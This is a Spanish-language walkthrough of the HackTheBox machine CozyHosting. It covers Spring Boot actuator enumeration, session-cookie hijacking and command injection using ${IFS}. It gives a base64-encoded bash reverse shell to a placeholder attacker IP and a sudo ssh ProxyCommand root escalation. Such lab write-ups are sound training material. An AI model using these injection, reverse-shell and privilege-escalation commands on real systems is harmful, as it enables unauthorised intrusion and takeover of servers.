---
layout: post
title: CozyHosting
parent: HackTheBox
---
# CozyHosting
{: .no_toc }

## Contenidos
{: .no_toc .text-delta}

1. TOC
{:toc}

---
{:.lead}

# Fase de reconocimiento:

Comenzaremos analizando el TTL de la maquina:

> No olvidemos, el TTL de un sistema Linux es <=64

Acto seguido, realizaremos un reconocimiento de **puertos abiertos** del servidor:
![](/assets/img/HTB_CozyHosting/C1.png)

Como podemos apreciar, al analizar el puerto **80**, vemos que emplea un redirect a un dominio: "cozyhosting.htb", por lo que lo agregaremos al **/etc/hosts**

Ahora, si introducimos la direccion IP, dentro de nuestro navegador, veremos lo siguiente:

![](/assets/img/HTB_CozyHosting/C2.png)

Pero, si nos ponemos a jugar con la pagina... Veremos que a veces nos arroja un error filtrando el servicio que se usa detras:

![](/assets/img/HTB_CozyHosting/C3.png)

Por lo que si buscamos por la web, veremos que se trata de **SPRING BOOT**, asi que buscamos en nuestra web de confianza [HackTricks](https://book.hacktricks.xyz/)

Si analizamos, vemos que tenemos habilitada la direccion: **/actuator/env**
![](/assets/img/HTB_CozyHosting/C4.png)

Por lo que tendriamos que ver una forma de listar los directorios disponibles, si analizamos unas de las herramientas usadas para pentesting: **"SecLists"**, encontraremos un diccionario para el framework Spring:
![](/assets/img/HTB_CozyHosting/C5.png)

Como podemos apreciar, tenemos la ruta interesante de: **/sessions**, por lo que listaremos que nos retorna:
![](/assets/img/HTB_CozyHosting/C6.png)
Podemos apreciar lo que parecen ser cookies, asi que efectuaremos un Cookie Hijacking para entrar como administrador, sin proporcionar una password.
![](/assets/img/HTB_CozyHosting/C7.png)
Como podemos apreciar, hemos efectuado un login bypass, por lo que ahora nos queda ver la forma de meternos al servidor.

Podemos ver que usa un servicio que "agrega" un host:
![](/assets/img/HTB_CozyHosting/C8.png)

# Intrusion

Vemos que si forzamos un error, en este caso, dejando el input del **username** vacio, genera un error en el servicio que se usa haciendo un leak de la herramienta, por lo que tendremos que ver la forma de ejecutar un comando.
![](/assets/img/HTB_CozyHosting/C9.png)

Entonces, trataremos de ejecutar un:

```bash
sleep 5
```
![](/assets/img/HTB_CozyHosting/C10.png)

Por lo que efectivamente podemos comprobar que se ejecuta el comando.

## Entendiendo el ${IFS}
Si podemos apreciar, no usamos un "+", para poder ejecutar el comando, sino un: **"${IFS}"**, esto es debido a que es una variable que bash interpreta como un **Salto de linea**, **Internal Field Separator** en ingles:
![](/assets/img/HTB_CozyHosting/C11.png)

Continuando con la intrusion, nos quedaria ejecutar una reverse shell a traves de bash, yo usare un **base64 decode**:
![](/assets/img/HTB_CozyHosting/C12.png)
```bash
echo "bash -c 'bash -i >&/dev/tcp/TU-IP/PUERTO 0>&1'" | base64
```
Por lo que queda ejecutar nuestro comando:
![](/assets/img/HTB_CozyHosting/C13.png)

# Ingresando al servidor
Una vez dentro, no olvidemos hacer un tratamiento de la TTY, para evitar incomodidades:

```bash/
python3 'import pty;pty.spawn("/bin/bash")'
```
Para luego hacer un **CTL+Z** e introducir:
```bash
stty raw -echo;fg
  reset xterm
```
![](/assets/img/HTB_CozyHosting/C14.png)

Si listamos, encontraremos un **.jar**, en pocas palabras un archivo de Java, que pueda a lo mejor contener credenciales:
Lo pasamos a nuestra maquina, para descomprimirlo:
![](/assets/img/HTB_CozyHosting/C15.png)

> Si queremos filtrar todo de forma recursiva, nos podemos apoyar en el comando: grep -r "busqueda"

![](/assets/img/HTB_CozyHosting/C16.png)
Encontramos credenciales de lo que parece ser una base de datos en **Postgres**, por lo que queda probarla.

Una vez probada, podemos ver que existen las siguientes tablas:
![](/assets/img/HTB_CozyHosting/C17.png)
Y buscaremos credenciales que nos sean utiles para subir nuestros privilegios
![](/assets/img/HTB_CozyHosting/C18.png)
Una vez descubierta la password, buscaremos usuarios existentes para conectarnos, esto lo veremos leyendo el **/etc/passwd**:
![](/assets/img/HTB_CozyHosting/C19.png)

# PRIVESC
Como podemos apreciar, tenemos el usuario y la password... Asi que nos conectaremos por el puerto 22-SSH
```bash
ssh josh@IPdelServidor
```
Una vez dentro, listaremos los permisos y vemos que poseemos permisos de sudoers para el comando **ssh**, por lo que visitaremos la web de confianza [GTFObins](https://gtfobins.github.io/gtfobins/ssh/#sudo)
Y nos recomendara, el siguiente comando:
```bash
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```
![](/assets/img/HTB_CozyHosting/C20.png)
# FIN
